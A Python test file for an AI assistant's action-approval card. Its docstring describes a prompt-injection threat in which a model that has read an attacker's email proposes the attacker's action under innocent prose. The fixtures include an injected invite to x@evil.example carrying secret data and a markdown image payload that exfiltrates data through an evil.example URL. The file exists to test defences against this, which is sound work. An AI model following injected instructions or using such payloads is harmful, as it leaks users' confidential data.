"""The approval card: what the user sees when a chat action pauses.

docs/prompt_injection_hardening.md, P1. A model that has read an attacker's
email proposes the attacker's action and describes it innocently, so what the
user approves must be rendered by the server from the arguments ADK actually
paused on, never the model's prose. Pinned here:

* the card shows the real arguments and warns about outside recipients;
* the card replaces whatever the model said, in both chat paths;
* the pause is parked even when the model streamed text first (that used to
  drop it, and the system prompt asks for exactly that text);
* a pause whose call cannot be found is never parked;
* "yes" approves every action the card listed;
* every armed tool has a renderer, and none crashes on odd arguments.

The ADK Runner is faked; no Vertex, database or network.
"""

from __future__ import annotations

import asyncio
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from google.adk.tools import FunctionTool

from rubik_core.agent_runtime import coordinator
from rubik_core.auth.registry import UserProfile
from rubik_core.orchestration import adk_orchestrator as ao
from rubik_core.orchestration.confirmation_render import (
    RenderContext,
    confirmation_markdown,
    external_addresses,
    has_renderer,
    render_confirmation,
)
from rubik_core.tools.scheduled_tasks_tools import ScheduledTaskChatTools

ATTACK = {
    "summary": "Quick sync",
    "start_time": "2026-10-27T14:00:00-06:00",
    "end_time": "2026-10-27T14:30:00-06:00",
    "description": "SECRET pipeline numbers",
    "attendees": ["bellison@acme.example", "x@evil.example"],
}
MODEL_PROSE = "Sure, I'll put a quick sync with your team on the calendar."


@pytest.fixture(autouse=True)
def _domains(monkeypatch, set_test_workspace_domains):
    set_test_workspace_domains("acme.example")


# ── the renderer ────────────────────────────────────────────────────────────


def test_a_calendar_invite_shows_every_value_and_warns_about_outsiders():
    view = render_confirmation("calendar_create_event", ATTACK)

    values = {f.label: f.value for f in view.fields}
    assert values["Title"] == "Quick sync"
    assert "x@evil.example" in values["Invites"]
    assert "bellison@acme.example" in values["Invites"]
    assert values["Description"] == "SECRET pipeline numbers"
    assert values["Starts"].startswith("Tuesday, October 27, 2026, 2:00 PM")
    (warning,) = view.warnings
    assert "1 person outside your company: x@evil.example" in warning
    assert "description" in warning


def _saved_company(monkeypatch, name: str) -> None:
    from rubik_core.company import profile

    monkeypatch.setattr(
        profile,
        "get_company_profile",
        lambda db=None: profile.CompanyProfile(name=name),
    )


def test_the_outside_warning_names_the_company_once_its_profile_is_saved(
    monkeypatch,
):
    """Spec §4.1: the workspace's company name replaces a fixed "your company"
    in UI copy; with no profile saved the card still reads naturally."""
    _saved_company(monkeypatch, "Acme Corp")
    (warning,) = render_confirmation("calendar_create_event", ATTACK).warnings
    assert "1 person outside Acme Corp: x@evil.example" in warning

    routine = render_confirmation(
        "create_meeting_routine", {"skill": "recap", "external_only": True}
    )
    when = {f.label: f.value for f in routine.fields}["When"]
    assert "someone from outside Acme Corp was invited" in when

    skill = render_confirmation(
        "save_meeting_skill",
        {"name": "Recap", "deliver_as": "email_draft_to_attendees"},
    )
    assert any("people outside Acme Corp" in w for w in skill.warnings)


def test_the_outside_warning_says_your_company_with_no_profile(monkeypatch):
    _saved_company(monkeypatch, "")
    (warning,) = render_confirmation("calendar_create_event", ATTACK).warnings
    assert "1 person outside your company: x@evil.example" in warning
    for bad in ("None", "{company}", "outside :", "outside  "):
        assert bad not in warning


def test_an_invite_to_colleagues_only_carries_no_warning():
    args = dict(ATTACK, attendees=["ifoster@acme.example"])
    assert render_confirmation("calendar_create_event", args).warnings == []


@pytest.mark.parametrize(
    "addresses, outside",
    [
        (["a@acme.example"], []),
        (["Ana <a@acme.example>"], []),
        (["a@sub.acme.example"], []),
        (["a@acme.example.evil.example"], ["a@acme.example.evil.example"]),
        (["a@evilacme.example"], ["a@evilacme.example"]),
        # Two addresses in one string: never judged on the first one alone.
        (["b@acme.example, a@evil.example"], ["b@acme.example, a@evil.example"]),
        (["not an address"], ["not an address"]),
    ],
)
def test_outside_addresses(addresses, outside):
    assert external_addresses(addresses) == outside


def test_a_comma_joined_attendee_string_is_split_and_checked():
    args = dict(ATTACK, attendees="b@acme.example, a@evil.example")
    view = render_confirmation("calendar_create_event", args)
    assert "a@evil.example" in view.warnings[0]


def test_a_new_scheduled_task_shows_the_full_instruction_and_warns():
    prompt = "Summarize my unread Gmail. " * 200  # long: shown whole, never cut
    view = render_confirmation(
        "create_scheduled_task",
        {
            "title": "Morning emails",
            "prompt": prompt,
            "schedule_kind": "weekdays",
            "time_local": "08:00",
            "deliver_by_email": True,
        },
        RenderContext(timezone="America/Chicago"),
    )
    values = {f.label: f.value for f in view.fields}
    assert values["Instruction"] == prompt.strip()
    assert values["Runs"] == "every weekday at 8:00 AM (America/Chicago)"
    assert values["Results go to"] == "your chat, a Slack DM and email"
    assert any("nobody watching" in w for w in view.warnings)


def test_the_text_version_cannot_turn_an_argument_into_a_link_or_image():
    """The card's text is the saved answer and what older views render as
    markdown, so an argument must show as written."""
    args = dict(ATTACK, summary="![x](https://evil.example/?d=1)")
    md = confirmation_markdown([render_confirmation("calendar_create_event", args)])
    assert "`![x](https://evil.example/?d=1)`" in md


def _armed(tool) -> bool:
    for attr in ("require_confirmation", "_require_confirmation"):
        if hasattr(tool, attr):
            return bool(getattr(tool, attr))
    return False


def test_every_armed_tool_has_a_renderer_and_survives_odd_arguments():
    agent = coordinator.build_coordinator(
        user_email="bellison@acme.example",
        scheduled_tasks_tools=ScheduledTaskChatTools(
            user_email="bellison@acme.example"
        ),
    )
    armed = [t.name for t in agent.tools if isinstance(t, FunctionTool) and _armed(t)]
    assert len(armed) >= 4

    missing = [name for name in armed if not has_renderer(name)]
    assert missing == [], f"armed tools with no confirmation renderer: {missing}"

    odd = {
        "attendees": 7,
        "days_of_week": ["x"],
        "start_time": None,
        "internal_note": "maybe",
        "prompt": {"nested": True},
    }
    for name in armed:
        for args in ({}, odd):
            view = render_confirmation(name, args)
            assert view.title and view.fields


def test_a_tool_without_a_renderer_falls_back_to_every_argument():
    view = render_confirmation("send_fax", {"to": "x@evil.example", "body": "y" * 5000})
    values = {f.label: f.value for f in view.fields}
    assert values["To"] == "x@evil.example"
    assert "more characters not shown" in values["Body"]
    assert "x@evil.example" in view.warnings[0]


# ── the orchestrator ────────────────────────────────────────────────────────


def _user():
    return UserProfile(
        id="t",
        email="bellison@acme.example",
        name="Test",
        department="systems",
        roles=["user"],
        created_at="2026-01-01T00:00:00Z",
        updated_at="2026-01-01T00:00:00Z",
    )


class _FC:
    def __init__(self, name, args=None, fc_id="fc-1"):
        self.name = name
        self.args = args or {}
        self.id = fc_id


class _Part:
    def __init__(self, text):
        self.text = text


class _Event:
    def __init__(
        self,
        *,
        partial=False,
        final=False,
        confirmations=None,
        fcs=None,
        text=None,
        invocation_id="inv-42",
    ):
        self.partial = partial
        self._final = final
        self.actions = SimpleNamespace(requested_tool_confirmations=confirmations or {})
        self._fcs = fcs or []
        self.content = SimpleNamespace(parts=[_Part(text)]) if text else None
        self.invocation_id = invocation_id
        self.usage_metadata = None

    def is_final_response(self):
        return self._final

    def get_function_calls(self):
        return self._fcs

    def get_function_responses(self):
        return []


def _pause_events(*, prose_first: bool, streamed: bool):
    """The shape ADK 1.30 produces: the model's call (with any text), the
    confirmation request, then the paused function response."""
    events = []
    if prose_first and streamed:
        events.append(_Event(partial=True, text=MODEL_PROSE))
    if prose_first and not streamed:
        events.append(_Event(final=True, text=MODEL_PROSE))
    events.append(_Event(fcs=[_FC("calendar_create_event", ATTACK)]))
    conf = SimpleNamespace(hint="approve?", payload={})
    events.append(
        _Event(
            final=True,
            fcs=[
                _FC(
                    "adk_request_confirmation",
                    {"originalFunctionCall": {"id": "fc-1"}},
                    fc_id="conf-1",
                )
            ],
        )
    )
    events.append(_Event(final=True, confirmations={"fc-1": conf}))
    return events


class _Session:
    def __init__(self, events=None):
        self.id = "sess"
        self.events = events or []


def _patched(events, session=None, seen=None):
    class _Runner:
        def __init__(self, **kwargs):
            pass

        async def run_async(self, **kwargs):
            if seen is not None:
                seen.update(kwargs)
            for e in events:
                yield e

    class _Sessions:
        async def get_session(self, **kwargs):
            return session or _Session()

        async def create_session(self, **kwargs):
            return session or _Session()

    return (
        patch.object(ao, "Runner", _Runner),
        patch.object(ao, "get_session_service", lambda: _Sessions()),
        patch.object(ao, "build_coordinator", lambda **kwargs: MagicMock()),
    )


def _run(events, *, query="book it", db_session=None, session=None, seen=None):
    p1, p2, p3 = _patched(events, session, seen)
    with p1, p2, p3:
        orch = ao.ADKOrchestrator(user=_user(), timezone="America/Chicago")
        return asyncio.run(
            orch.run(request_id="t", query=query, history=[], db_session=db_session)
        )


def _stream(events, *, query="book it", db_session=None):
    p1, p2, p3 = _patched(events)
    with p1, p2, p3:
        orch = ao.ADKOrchestrator(user=_user(), timezone="America/Chicago")

        async def collect():
            return [
                ev
                async for ev in orch.run_streaming(
                    request_id="t", query=query, history=[], db_session=db_session
                )
            ]

        return asyncio.run(collect())


def _assert_card(answer: str, confirmation: dict):
    assert MODEL_PROSE not in answer
    assert "x@evil.example" in answer and "SECRET pipeline numbers" in answer
    (action,) = confirmation["actions"]
    assert action["tool"] == "calendar_create_event"
    assert any("outside your company" in w for w in action["warnings"])


def test_the_buffered_answer_is_the_card_not_the_model_text():
    db_session = SimpleNamespace(last_adk_invocation_id=None)
    result = _run(
        _pause_events(prose_first=True, streamed=False), db_session=db_session
    )

    _assert_card(result.answer, result.confirmation)
    assert db_session.last_adk_invocation_id == "inv-42"


def test_a_stream_parks_the_pause_even_after_the_model_streamed_text():
    db_session = SimpleNamespace(last_adk_invocation_id=None)
    events = _stream(
        _pause_events(prose_first=True, streamed=True), db_session=db_session
    )

    done = next(e for e in events if e["type"] == "done")
    assert done["awaiting_confirmation"] is True
    _assert_card(done["answer"], done["confirmation"])
    assert db_session.last_adk_invocation_id == "inv-42"


def test_a_pause_whose_call_cannot_be_found_is_never_parked():
    conf = SimpleNamespace(hint="approve?", payload={})
    events = [_Event(final=True, confirmations={"fc-missing": conf})]
    db_session = SimpleNamespace(last_adk_invocation_id="older")

    result = _run(events, db_session=db_session)

    assert result.confirmation is None
    assert "couldn't read what it was" in result.answer
    assert db_session.last_adk_invocation_id is None


def test_yes_approves_every_action_the_card_listed():
    parked = _Event(
        fcs=[
            _FC("adk_request_confirmation", fc_id="conf-1"),
            _FC("adk_request_confirmation", fc_id="conf-2"),
        ],
        invocation_id="inv-42",
    )
    seen: dict = {}
    _run(
        [_Event(final=True, text="Done.")],
        query="yes",
        db_session=SimpleNamespace(last_adk_invocation_id="inv-42"),
        session=_Session([parked]),
        seen=seen,
    )

    approvals = [
        p.function_response.id
        for p in seen["new_message"].parts
        if getattr(p, "function_response", None)
    ]
    assert approvals == ["conf-1", "conf-2"]
